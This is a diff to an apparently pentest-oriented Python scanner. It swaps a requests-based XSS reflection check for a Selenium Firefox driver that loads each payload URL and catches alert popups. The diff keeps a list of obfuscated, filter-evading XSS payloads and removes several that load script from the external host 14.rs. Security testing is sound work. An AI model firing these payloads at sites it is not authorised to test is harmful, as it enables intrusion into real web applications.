@@ -1,5 +1,12 @@
 import requests
+import platform
+import time
+import os
 from colorama import Fore, Style
+from selenium import webdriver
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.firefox.options import Options
+
 
 fg = Fore.GREEN
 fr = Fore.RED
@@ -33,19 +40,21 @@ def check_file_uploads_and_xss(domain, cookies, headers):
         '<svg/x=">"/onload=confirm()//',
         '<svg%0Aonload=%09((pro\u006dpt))()//',
         '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
-        '<sCript x>confirm``</scRipt x>',
-        '<Script x>prompt()</scRiPt x>',
-        '<sCriPt sRc=//14.rs>',
-        '<embed//sRc=//14.rs>',
-        '<base href=//14.rs/><script src=/>',
-        '<object//data=//14.rs>',
-        '<s=" onclick=confirm``>clickme',
-        '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
-        '\'"><y///oNMousEDown=((confirm))()>Click',
-        '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
-        '<img src=x onerror=confir\u006d`1`>',
-        '<svg/onload=co\u006efir\u006d`1`>'
     ]
+
+    os_type = platform.system()
+    if os_type == "Windows":
+        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
+    elif os_type in ["Linux", "Darwin"]:  # Für Linux und MacOS
+        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
+    else:
+        raise Exception(f"Unsupported OS: {os_type}")
+
+    service = FirefoxService(executable_path=geckodriver_path)
+    options = Options()
+    options.headless = False  
+
+    driver = webdriver.Firefox(service=service, options=options)
 
     for path in paths:
         url = domain + path
@@ -60,10 +69,27 @@ def check_file_uploads_and_xss(domain, cookies, headers):
 
     for payload in xss_payloads:
         try:
-            response = requests.get(f"{domain}/?q={payload}", headers=headers, cookies=cookies, verify=False, timeout=10)
-            if payload in response.text:
-                print(f"{fg}[+] XSS vulnerability detected with payload: {payload}{fw}")
+            full_url = f"{domain}/{payload}"
+            driver.get(full_url)
+
+            time.sleep(5)
+
+            script_alert = False
+            try:
+                alert = driver.switch_to.alert
+                alert.accept()
+                script_alert = True
+            except:
+                pass
+
+            if script_alert:
+                print(f"{fg}[+] XSS vulnerability detected with payload (popup): {payload}{fw}")
+            elif payload in driver.page_source:
+                print(f"{fg}[+] XSS vulnerability detected with payload (reflected): {payload}{fw}")
             else:
                 print(f"{fy}[-] No XSS vulnerability detected with payload: {payload}{fw}")
-        except requests.exceptions.RequestException as e:
+
+        except Exception as e:
             print(f"{fr}[-] Error checking XSS vulnerability with payload {payload}: {e}{fw}")
+
+    driver.quit()
